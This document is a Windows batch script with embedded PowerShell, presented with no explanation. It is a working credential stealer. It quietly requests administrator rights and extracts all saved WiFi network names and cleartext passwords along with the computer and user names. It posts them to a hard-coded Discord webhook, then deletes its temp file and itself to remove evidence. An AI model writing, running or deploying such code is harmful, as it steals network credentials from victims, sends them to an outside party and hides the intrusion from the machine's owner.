@echo off
net session >nul 2>&1
if %errorLevel% == 0 (
    REM Extract WiFi credentials
    set filepath=%TEMP%\wifi_creds_%random%.txt
    
    REM Get system info and WiFi credentials
    powershell -Command "$output = @(); $output += '============================================'; $output += 'WiFi Credentials Captured!'; $output += 'Computer: ' + $env:COMPUTERNAME; $output += 'User: ' + $env:USERNAME; $output += 'Date: ' + (Get-Date).ToString(); $output += '============================================'; $output += ''; try { $profiles = netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { ($_ -split ':')[1].Trim() }; if($profiles) { foreach($profile in $profiles) { $output += 'WiFi Name: ' + $profile; $passInfo = netsh wlan show profile name=$profile key=clear | Select-String 'Key Content'; if($passInfo) { $pass = ($passInfo -split ':')[1].Trim(); $output += 'Password: ' + $pass } else { $output += 'Password: (Open/No Password)' }; $output += '---' } } else { $output += 'No WiFi profiles found!' } } catch { $output += 'Error: ' + $_.Exception.Message }; $output -join \"`n\" | Out-File '%filepath%' -Encoding utf8"
    
    REM Wait a moment for file to be written
    timeout /t 2 /nobreak >nul
    
    REM Send to Discord webhook
    powershell -Command "try { $content = Get-Content '%filepath%' -Raw; if(!$content) { $content = 'Error: No data extracted' }; if($content.Length -gt 1800) { $content = $content.Substring(0,1800) + '... (truncated)' }; $json = @{ content = '**WiFi Credentials Captured!**' + [char]0x0060 + [char]0x0060 + [char]0x0060 + $content + [char]0x0060 + [char]0x0060 + [char]0x0060 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1429765407006527538/ZvNQHk-1RsSEN0u12m6LZtSOqm3cIgeKBs5I5Y4rE57XI94dmdYLyKBXJKKM9XGR_uWK' -Method Post -Body $json -ContentType 'application/json; charset=utf-8' } catch { }"
    
    REM Clean up evidence
    timeout /t 1 /nobreak >nul
    del "%filepath%" /q 2>nul
    del "%~f0" /q 2>nul
    exit /b
) else (
    REM Request admin privileges
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
